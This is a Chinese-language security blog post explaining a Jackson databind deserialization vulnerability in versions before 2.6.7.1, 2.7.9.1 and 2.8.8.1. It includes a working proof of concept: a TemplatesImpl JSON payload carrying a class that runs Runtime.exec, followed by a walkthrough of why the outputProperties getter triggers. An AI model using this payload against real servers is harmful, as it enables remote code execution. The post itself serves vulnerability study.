# Jackson反序列化（二）

  
  
&lt;!--more--&gt;  
## 0x01 影响版本  
Jackson 2.6 &lt; 2.6.7.1  
Jackson 2.7 &lt; 2.7.9.1  
Jackson 2.8 &lt; 2.8.8.1  
## 0x02 限制  
由于是打的 TemplaesImpl 链，所以要求 JDK 版本是 7u21 或者 8u20，动态代理相关的链子。  
## 0x03 漏洞复现  
Test.java  
```java  
public class Test{  
	public Object object;  
}  
```  
SimpleCalc.java  
```java  
import com.sun.org.apache.xalan.internal.xsltc.DOM;    
import com.sun.org.apache.xalan.internal.xsltc.TransletException;    
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;    
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;    
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;    
    
public class SimpleCalc extends AbstractTranslet {    
    
    public SimpleCalc() throws Exception {    
        Runtime.getRuntime().exec(&#34;open -a Calculator&#34;);    
    }    
    
    @Override    
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {    
    
    }    
    
    @Override    
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {    
    
    }    
}  
```  
Poc.java  
```java  
import com.fasterxml.jackson.databind.ObjectMapper;    
    
import javax.xml.bind.DatatypeConverter;    
import java.io.File;    
import java.io.FileInputStream;    
    
    
public class Poc {    
    public static void main(String[] args) throws Exception {    
        String exp = readClassStr(&#34;/Users/f10wers13eicheng/Desktop/Java/JacksonDemo1/src/main/java/SimpleCalc.class&#34;);    
        String jsonInput = aposToQuotes(&#34;{\&#34;object\&#34;:[&#39;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#39;,\n&#34; &#43;    
                &#34;{\n&#34; &#43;    
                &#34;&#39;transletBytecodes&#39;:[&#39;&#34;&#43;exp&#43;&#34;&#39;],\n&#34; &#43;    
                &#34;&#39;transletName&#39;:&#39;huahua&#39;,\n&#34; &#43;    
                &#34;&#39;outputProperties&#39;:{}\n&#34; &#43;    
                &#34;}\n&#34; &#43;    
                &#34;]\n&#34; &#43;    
                &#34;}&#34;);    
        System.out.println(jsonInput);    
        ObjectMapper mapper = new ObjectMapper();    
        mapper.enableDefaultTyping();    
        Test test;    
        try{    
            test = mapper.readValue(jsonInput, Test.class);    
        }catch(Exception e){    
            e.printStackTrace();    
        }    
    }    
    
    
    public static String aposToQuotes(String json){    
        return json.replace(&#34;&#39;&#34;, &#34;\&#34;&#34;);    
    }    
    public static String readClassStr(String cls) throws Exception{    
        File file = new File(cls);    
        FileInputStream fileInputStream = new FileInputStream(file);    
        byte[] bytes = new byte[(int) file.length()];    
        fileInputStream.read(bytes);    
        String base64Encoded = DatatypeConverter.printBase64Binary(bytes);    
        return base64Encoded;    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411122340342.png)
Jackson 是调用任意的构造函数与任意的`setter`方法，为什么会触发这条链子呢？  
7u21这条链子本质上其实是`TemplateImpl`类的类动态加载，配合上动态代理来打的，可是这里不论是动态代理，还是`TeamplaesImpl.getOutputProperties()`，都和 Jackson 没关系。  
## 0x04 漏洞分析  
首先是第一次到`com.fasterxml.jackson.databind.deser.BeanDeserializer#deserialize`方法，反序列化Test类，会走到其构造函数里面，并且继续处理`object`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411132219288.png)
继续往下走，下一步是反序列化 object 里面的数据  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411132223084.png)
这里看一下`_beanProperties`里的值  
```  
Properties=[uriresolver([simple type, class javax.xml.transform.URIResolver]), transletBytecodes([array type, component type: [array type, component type: [simple type, class byte]]]), outputProperties([map type; class java.util.Properties, [simple type, class java.lang.String] -&gt; [simple type, class java.lang.String]]), transletName([simple type, class java.lang.String]), stylesheetDOM([simple type, class com.sun.org.apache.xalan.internal.xsltc.DOM])]  
```  
除了`setter`函数中的属性之外，还有`outputProperties`，为什么`outputProperties`会被拿到呢？因为`outputProperties`属性有相应的`getter`方法，而其他属性却没有  
接着来看看对于`outputProperties`是怎么处理的  
`outputProperties`属性在`deserializeAndSet()`函数中是通过反射机制调用它的`getter`方法，这就是该利用链能被成功触发的原因  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411132226184.png)
这里也指出了一条攻击利用手法，也就是构造函数中存在的属性，不存在`setter`方法时，都会自动调用到`getter`方法。  

---

> Author: N1Rvana  
> URL: http://localhost:1313/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%8C/  

